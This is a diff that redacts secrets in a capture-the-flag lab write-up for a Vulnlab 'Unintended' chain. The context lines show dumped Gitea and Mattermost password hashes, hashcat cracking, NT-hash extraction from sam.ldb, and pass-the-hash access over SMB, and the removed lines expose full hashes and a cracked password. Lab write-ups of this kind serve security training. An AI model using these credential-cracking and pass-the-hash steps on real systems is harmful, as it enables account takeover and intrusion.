@@ -753,8 +753,8 @@ MySQL [gitea]> select email,passwd,passwd_hash_algo,salt,is_admin from user;
 +-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
 | email                       | passwd                                                                                               | passwd_hash_algo | salt                             | is_admin |
 +-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
-| administrator@unintended.vl | f57a3d5d199ac8054c709e665b4eb4842f0e172a253a96038be5ef9e6fe7b0290f2d715524883dd117ac309e878c1dbbe902 | pbkdf2$50000$50  | 6f7cf4aa34feb922092ef9f7ca342fa5 |        1 |
-| juan@unintended.vl          | d8bf3dff89969075cd73cc1496942901ea132619454318cb37e4bec821d6867045bcbc0ac2905c2531ee5d6e6c5a475c9b51 | pbkdf2$50000$50  | a3914c8815b674a9f680eaf8eb799e19 |        0 |
+| administrator@unintended.vl | f57a3<........................................................................................>be902 | pbkdf2$50000$50  | 6f7cf4aa34feb922092ef9f7ca342fa5 |        1 |
+| juan@unintended.vl          | d8bf3<........................................................................................>c9b51 | pbkdf2$50000$50  | a3914c8815b674a9f680eaf8eb799e19 |        0 |
 +-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
 2 rows in set (0.021 sec)
 ```
@@ -779,20 +779,20 @@ b3z0qjT+uSIJLvn3yjQvpQ==
 ```
 
 ```shell-session
-└─$ echo 'f57a3d5d199ac8054c709e665b4eb4842f0e172a253a96038be5ef9e6fe7b0290f2d715524883dd117ac309e878c1dbbe902' | xxd -r -p | base64
-9Xo9XRmayAVMcJ5mW060hC8OFyolOpYDi+Xvnm/nsCkPLXFVJIg90ResMJ6HjB276QI=
+└─$ echo 'f57a3<REDACTED>be902' | xxd -r -p | base64
+9Xo9X<REDACTED>76QI=
 ```
 
 Save in `administrator.gitea.hash`:
 
 ```
-sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9XRmayAVMcJ5mW060hC8OFyolOpYDi+Xvnm/nsCkPLXFVJIg90ResMJ6HjB276QI=
+sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9X<REDACTED>76QI=
 ```
 
 ```shell-session
 └─$ hashcat -a0 -m10900 administrator.gitea.hash /usr/share/wordlists/rockyou.txt
 ...
-sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9XRmayAVMcJ5mW060hC8OFyolOpYDi+Xvnm/nsCkPLXFVJIg90ResMJ6HjB276QI=:<ADMIN_GITEA_PASS>
+sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9X<REDACTED>76QI=:<ADMIN_GITEA_PASS>
 ```
 
 We can try to do the same with juan's hash but it doesn't crack with `rockyou.txt`.
@@ -1324,15 +1324,15 @@ mattermost=# select email,password from users;
  playbooks@localhost     | 
  boards@localhost        | 
  system-bot@localhost    | 
- juan@unintended.vl      | $2a$10$XVsJbRoMGb3NmEkOV2bVhuaf2zf2U90z1BH1LR5.9EVphcIClf7aa
- cartor@unintended.vl    | $2a$10$1LN52Ej8HDksuM51/a6yDeLEQsw5F6pOQRYNxNQZEGezBreDaMRC.
- abbie@unintended.vl     | $2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu
+ juan@unintended.vl      | $2a$10$XVs<.............................................>7aa
+ cartor@unintended.vl    | $2a$10$1LN<.............................................>RC.
+ abbie@unintended.vl     | $2a$10$2IN<.............................................>0mu
 (10 rows)
 ```
 
 ```shell-session
-└─$ hashid -m '$2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu'                        
-Analyzing '$2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu'
+└─$ hashid -m '$2a$10$2IN<REDACTED>0mu'                        
+Analyzing '$2a$10$2IN<REDACTED>0mu'
 [+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
 [+] Woltlab Burning Board 4.x 
 [+] bcrypt [Hashcat Mode: 3200]
@@ -1349,12 +1349,12 @@ Then we generate a wordlist of possible candidates with [cook](https://github.co
 ```
 
 ```shell-session
-└─$ hashcat -a0 -m3200 '$2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu' abbie.wordlist
+└─$ hashcat -a0 -m3200 '$2a$10$2IN<REDACTED>0mu' abbie.wordlist
 ...
-$2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu:Abbie1998
+$2a$10$2IN<REDACTED>0mu:<ABBIE_MM_PASS>
 ```
 
-By logging in with email `abbie@unintended.vl` and password `Abbie1998` we can then find the same message as above.
+By logging in with email `abbie@unintended.vl` and the password we just cracked we can then find the same message as above.
 
 ![](/assets/vulnlab/chains/unintended/img/18.png)
 
@@ -1612,7 +1612,7 @@ Let's extract Administrator's hash:
 └─$ ldbsearch -H sam.ldb '(samaccountname=Administrator)' 'unicodepwd'            
 # record 1
 dn: CN=Administrator,CN=Users,DC=unintended,DC=vl
-unicodePwd:: Nv4<...>4ow==
+unicodePwd:: Nv4<REDACTED>4ow==
 
 # Referral
 ref: ldap:///CN=Configuration,DC=unintended,DC=vl
@@ -1629,30 +1629,30 @@ ref: ldap:///DC=ForestDnsZones,DC=unintended,DC=vl
 ```
 
 ```shell-session
-└─$ echo 'Nv4<...>4ow==' | base64 -d | xxd -p
-36fe<...>f8a3
+└─$ echo 'Nv4<REDACTED>4ow==' | base64 -d | xxd -p
+36fe<REDACTED>f8a3
 ```
 
 It doesn't crack with `rockyou.txt`:
 
 ```shell-session
-└─$ hashcat -a0 -m1000 36fe<...>f8a3 /usr/share/wordlists/rockyou.txt
+└─$ hashcat -a0 -m1000 36fe<REDACTED>f8a3 /usr/share/wordlists/rockyou.txt
 ```
 
 However we can use pass-the-hash over SMB:
 
 ```shell-session
-└─$ nxc smb dc -u Administrator -H 36fe<...>f8a3         
+└─$ nxc smb dc -u Administrator -H 36fe<REDACTED>f8a3         
 SMB         10.10.156.133   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
-SMB         10.10.156.133   445    DC               [+] unintended.vl\Administrator:36fe<...>f8a3 (Pwn3d!)
+SMB         10.10.156.133   445    DC               [+] unintended.vl\Administrator:36fe<REDACTED>f8a3 (Pwn3d!)
 ```
 
 We can read and write to our home directory:
 
 ```shell-session
-└─$ nxc smb dc -u Administrator -H 36fe<...>f8a3 --shares
+└─$ nxc smb dc -u Administrator -H 36fe<REDACTED>f8a3 --shares
 SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
-SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<...>f8a3 (Pwn3d!)
+SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<REDACTED>f8a3 (Pwn3d!)
 SMB         10.10.143.229   445    DC               [*] Enumerated shares
 SMB         10.10.143.229   445    DC               Share           Permissions     Remark
 SMB         10.10.143.229   445    DC               -----           -----------     ------
@@ -1665,7 +1665,7 @@ SMB         10.10.143.229   445    DC               IPC$                        
 By using `smbclient` with pass-the-hash we can read the root flag:
 
 ```shell-session
-└─$ smbclient -U Administrator --password=36fe<...>f8a3 --pw-nt-hash //dc.unintended.vl/home
+└─$ smbclient -U Administrator --password=36fe<REDACTED>f8a3 --pw-nt-hash //dc.unintended.vl/home
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Sat Mar 30 09:37:08 2024
@@ -1690,9 +1690,9 @@ VL{...}
 We can also read it with `nxc`:
 
 ```shell-session
-└─$ nxc smb dc -u Administrator -H 36fe<...>f8a3 --spider home --pattern txt
+└─$ nxc smb dc -u Administrator -H 36fe<REDACTED>f8a3 --spider home --pattern txt
 SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
-SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<...>f8a3 (Pwn3d!)
+SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<REDACTED>f8a3 (Pwn3d!)
 SMB         10.10.143.229   445    DC               [*] Started spidering
 SMB         10.10.143.229   445    DC               [*] Spidering .
 SMB         10.10.143.229   445    DC               //10.10.143.229/home/root.txt [lastm:'2024-03-30 09:37' size:37]
@@ -1700,9 +1700,9 @@ SMB         10.10.143.229   445    DC               [*] Done spidering (Complete
 ```
 
 ```shell-session
-└─$ nxc smb dc -u Administrator -H 36fe<...>f8a3 --share home --get-file root.txt root.txt
+└─$ nxc smb dc -u Administrator -H 36fe<REDACTED>f8a3 --share home --get-file root.txt root.txt
 SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
-SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<...>f8a3 (Pwn3d!)
+SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<REDACTED>f8a3 (Pwn3d!)
 SMB         10.10.143.229   445    DC               [*] Copying "root.txt" to "root.txt"
 SMB         10.10.143.229   445    DC               [+] File "root.txt" was downloaded to "root.txt"
 ```
@@ -1816,7 +1816,7 @@ sqlite> select * from Option;
 -2||last-webserver-port|8200
 -2||is-first-run|
 -2||server-port-changed|True
--2||server-passphrase|ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk=
+-2||server-passphrase|ZhB5v<REDACTED>uuQk=
 -2||server-passphrase-salt|j+7JQsuO7aggNAESQRkCBJd8dwdUE6A9QLTKXM3LB7w=
 -2||server-passphrase-trayicon|4f760941-ce8f-4e03-b427-a92319d6d763
 -2||server-passphrase-trayicon-hash|VHwBLiNdg/D545Utf8j67DSvqTvBmhpJIWzWmJCiV3o=
@@ -2090,7 +2090,7 @@ import requests
 import base64
 import hashlib
 
-server_passphrase = 'ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk='
+server_passphrase = 'ZhB5v<REDACTED>uuQk='
 
 s = requests.Session()
 
